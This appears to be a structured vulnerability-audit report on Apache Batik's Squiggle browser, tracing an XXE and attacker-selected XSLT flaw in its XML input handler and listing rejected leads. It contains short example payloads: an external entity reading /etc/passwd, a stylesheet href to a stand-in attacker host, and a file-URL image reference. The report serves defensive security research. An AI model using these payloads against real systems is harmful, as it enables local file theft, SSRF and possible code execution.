candidates.attacker_control: The XML/XSLT content is fully attacker-controlled: JSVGViewerFrame.showSVGDocument(uri) is reachable from the location bar, file open, history, and from following an <a xlink:href> link inside a rendered (possibly attacker-hosted) SVG via UserAgent.openLink (JSVGViewerFrame.java 2949-2954). The handler is selected for any URI whose path ends in .xml/.xsl (XMLInputHandler.accept, lines 142-154) and handlers are loaded via Service.providers(SquiggleInputHandler.class) (JSVGViewerFrame.java 1321-1330, registration is documented in samples/extensions/xsl/data.xml). Both the external entity declarations in the XML prolog and the XSLT href in the <?xml-stylesheet?> processing instruction come from the attacker's document.
candidates.counterevidence_checked: Checked the main SVG parser for the same weakness: batik-dom SAXDocumentFactory explicitly disables external general/parameter entities (lines 399-412 and 447-448), including the caller-supplied-XMLReader overload's parse-time feature calls, so normal .svg parsing is mitigated. Checked that the standard bridge external-resource consumers (SVGImageElementBridge 199-206, URIResolver 128-139, FontFace 148-158, SVGColorProfileElementBridge 122-137, CursorManager 456-468, FontFace web-font 205-206, CSSEngine.parseStyleSheet 1165-1168) all route through checkLoadExternalResource/URIResolver. Checked that the other DocumentBuilderFactory/TransformerFactory usages in main sources are debug-only (ImageIODebugUtil) or app-configured (user stylesheet in SVGDOMImplementation/SVG12DOMImplementation, output URI in ToSVGAbstractTranscoder). Checked that transcoding does not run scripts by default (SVGAbstractTranscoder KEY_EXECUTE_ONLOAD=false, scripts gated by getScriptSecurity).
candidates.impact: Information disclosure of local files (XXE entity expansion, and XSLT document() reads) and SSRF (fetching attacker-chosen http(s)/file URLs as the stylesheet or via document()), with potential arbitrary code execution in the Squiggle JVM when Java extension functions are available in the XSLT processor. Because the transformed result is displayed as SVG, disclosed data can be rendered/exfiltrated.
candidates.prerequisites: Squiggle (batik-svgbrowser) is used with the XML/XSLT input handler registered (as in the shipped distribution) and the user opens or navigates to an attacker-controlled .xml/.xsl document (single click on a link is sufficient). Java XML/XSLT stack (Xerces/Xalan, bundled in Batik's distribution) is on the classpath; for the code-execution part, Xalan extension functions must be enabled (default for the Xalan TransformerFactory unless secure processing is set) and no policy restriction must block the app's protection domain. Widget-level parsing in NodePickerPanel additionally requires the user to edit/apply XML text in the node picker.
candidates.root_cause: batik-svgbrowser's XMLInputHandler.handle builds a DOM with a plain DocumentBuilderFactory (only setValidating/setNamespaceAware, no disallow-doctype-decl, no external-general/parameter-entities=false, no FEATURE_SECURE_PROCESSING, no setExpandEntityReferences(false)) and then takes the stylesheet href out of the untrusted parsed document (extractXSLProcessingInstruction, preferring the document's own <?xml-stylesheet type="text/xsl" href="...">) and feeds it to a default TransformerFactory.newTransformer(...) with no Transcoding/user-agent external-resource check and no secure-processing setting. The project already applies the opposite hardening pattern in the SVG parser (batik-dom SAXDocumentFactory lines 399-412 and 447-448 disable external entities), so the omission here is an inconsistent, unmitigated parser, not a deliberate relaxation. The same root cause (plain DocumentBuilderFactory over attacker-influenced XML) also appears in NodePickerPanel.parseXml.
candidates.title: Unhardened XML/XSLT processing of untrusted input in the Squiggle XML input handler (XXE + attacker-selected XSLT)
candidates.trace: showSVGDocument/openLink -> getInputHandler(purl) -> XMLInputHandler.handle -> db.parse(uri) with external entity resolution enabled: a prolog such as <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> is resolved and expanded into the DOM. Then extractXSLProcessingInstruction(inDoc) reads the attacker's <?xml-stylesheet type="text/xsl" href="http://attacker/evil.xsl"?>, computes parsedXSLStyleSheetURI, and TransformerFactory.newTransformer(new StreamSource(...)) downloads and compiles that stylesheet without any checkLoadExternalResource/UserAgent check or URIResolver restriction (DocumentURIResolver, lines 319-335, simply returns a StreamSource for any href). transformer.transform(new DOMSource(inDoc), result) executes the attacker's XSLT in the viewer's JVM; XSLT document() can read further local/remote files and Xalan Java extension functions can invoke Java APIs. The resulting text is re-parsed as SVG and displayed. The same insecure factory setup is used by NodePickerPanel.parseXml (lines 846-874).
candidates.unverified: No runtime confirmation (no builds/tests/scanners run). The META-INF/services registration file for XMLInputHandler is not present in the snapshot, so handler registration is inferred from its SquiggleInputHandler implementation and the note in samples/extensions/xsl/data.xml. Xalan extension-function availability/secure-processing defaults and the Squiggle SecurityManager policy files (svgbrowser.policy.ref, absent from the snapshot) were not inspectable, so the exact severity of the XSLT-driven code-execution path is uncertain; the XXE/file-read/SSRF portion does not depend on those. Whether NodePickerPanel.parseXml is reachable with content that a remote attacker influences (rather than local user text) is unverified.
candidates.weakness_type: CWE-611 (XML External Entity) / unsafe processing of untrusted XSLT (CWE-918-style external fetch, potential code execution)

coverage_summary: Reviewed the 1804 readable files in the assigned snapshot (all 34 Maven modules of Apache Batik 1.9.0-SNAPSHOT); the same filters apply to B0/P1 and the P1 index covers all 1804 files with no omissions (`index_status: complete`, 0 hash mismatches, 26,883 symbols / 54,281 call rows). I performed text searches for JAXP/entity hardening, URL/file/stream sinks, script/JAR execution, reflection, deserialization, and security-framework classes, and read the security-critical code: batik-dom SAXDocumentFactory/SAXSVGDocumentFactory, Batik's ScriptSecurity/ExternalResourceSecurity family, BridgeContext/URIResolver/DocumentLoader, image/font/color-profile/cursor/CSS style-sheet loading bridges, ScriptingEnvironment/BaseScriptingEnvironment/Rhino* classes, ParsedURL/protocol handlers, the transcoder and rasterizer entry points, and the batik-svgbrowser input handlers and user agents. Relation-index navigation facts were used only to locate symbols/callers and were verified against source text.
limitations: No builds, tests, scanners or PoCs were executed; no runtime behaviour or exploitability was confirmed.

Resource/binary files are not in the visible snapshot: .svg test/sample files, bundled JARs (Xerces/Xalan/Rhino/FOP), Squiggle/rasterizer SecurityManager policy files (svgbrowser.policy.ref, rasterizer.policy.ref) and META-INF/services registration files are absent, so I could not verify handler registration from source or the exact Java-policy constraints on XSLT/XXE impact.

Large GUI/codec areas (e.g. DOMViewer, HistoryBrowser, batik-codec image codecs, batik-svggen, animation engine internals, most of batik-anim/batik-css parsers) were only swept by pattern search, not line-by-line reviewed.

The exact commit date of the snapshot could not be established from source alone (pom says 1.9.0-SNAPSHOT, Rhino 1.7.7 and xmlgraphics-commons 2.2.0-SNAPSHOT indicate a 2016-2017 window); no CVE/ground-truth information was consulted.

For the submitted candidate, the XSLT-extension-function/secure-processing defaults and the Squiggle policy grant could not be inspected, so the highest-severity outcome (RCE) remains unverified while the file-read/SSRF portion rests directly on the inspected code.

rejected_leads.lead: Default transcoder user agent allows all external resources: UserAgentAdapter.getExternalResourceSecurity (lines 362-366) returns RelaxedExternalResourceSecurity (a no-op checkLoadExternalResource, RelaxedExternalResourceSecurity.java 36-50), and SVGAbstractTranscoder's inner user agent does not override it, so the checks in SVGImageElementBridge/FontFace/SVGColorProfileElementBridge become no-ops for applications transcoding untrusted SVG (SSRF/local-file read, e.g. <image xlink:href="file:/etc/passwd"> or an internal http URL).
rejected_leads.reason: Genuine insecure-by-default behaviour and the historical Batik SSRF class, but it is a documented, named strategy (RelaxedExternalResourceSecurity) with first-class restrictive alternatives (Default/NoLoad) and an explicit UserAgent extension point; the snapshot contains no missing check, only a permissive default, so I classed it as a configuration/hardening lead rather than the single strongest code-level vulnerability.

rejected_leads.lead: Java-archive script execution in BaseScriptingEnvironment.loadScript (SVG_SCRIPT_TYPE_JAVA path, lines 391-445) can load and run classes named in an attacker-supplied JAR manifest (Script-Handler / SVG-Handler-Class).
rejected_leads.reason: By-design feature (documented in using/scripting/java.xml) and it is gated by ScriptSecurity/checkCompatibleScriptURL plus Squiggle's SecurityManager policy; no missing validation was found, so it does not meet the evidence threshold.

rejected_leads.lead: XXE in the primary SVG parser (batik-dom SAXDocumentFactory) — the classic Batik XXE.
rejected_leads.reason: Counterevidence: external general and parameter entities are explicitly disabled on both the static SAXParserFactory and each parser instance (lines 399-412, 447-448), so the XXE vector is mitigated in this snapshot.

rejected_leads.lead: ScriptingEnvironment.Window.getURL/postURL (lines 1073-1270) perform network I/O from script with no checkLoadExternalResource/user-agent check.
rejected_leads.reason: Reachable only from already-allowed script, and constrained by the app's SecurityManager policy; considered a design choice (browser-style window API) rather than a distinct code-level vulnerability.
Same root cause as the submitted candidate (unhardened DOM parsing in batik-svgbrowser) and lower reachability/impact; folded into the one candidate rather than reported separately.

summary: Snapshot is Apache Batik "1.9.0-SNAPSHOT" (1804 readable files, all 34 modules; SVG/JAR/policy resource files are absent from the snapshot). I traced attacker-controlled input through the XML, XSLT, external-resource, script/JAR and CSS style-sheet paths. The main SVG parsing path (batik-dom SAXDocumentFactory) is hardened: external general/parameter entities are disabled both on the factory and per parser (lines 399-412, 447-448), and the standard bridge resource paths (image/use/feImage/cursor/font/color-profile/CSS @import) all funnel through checkLoadExternalResource/URIResolver. The one code-level gap with unvalidated untrusted input is in the Squiggle browser's XML/XSLT input path (batik-svgbrowser), where JAXP factories are created without any XXE/secure-processing hardening and the XSLT stylesheet URI is taken from the untrusted input document and fetched with no Batik security check at all. I selected that as the single strongest candidate; the default relaxed external-resource policy and the Java-archive script path were considered and rejected as documented/configuration-level leads.
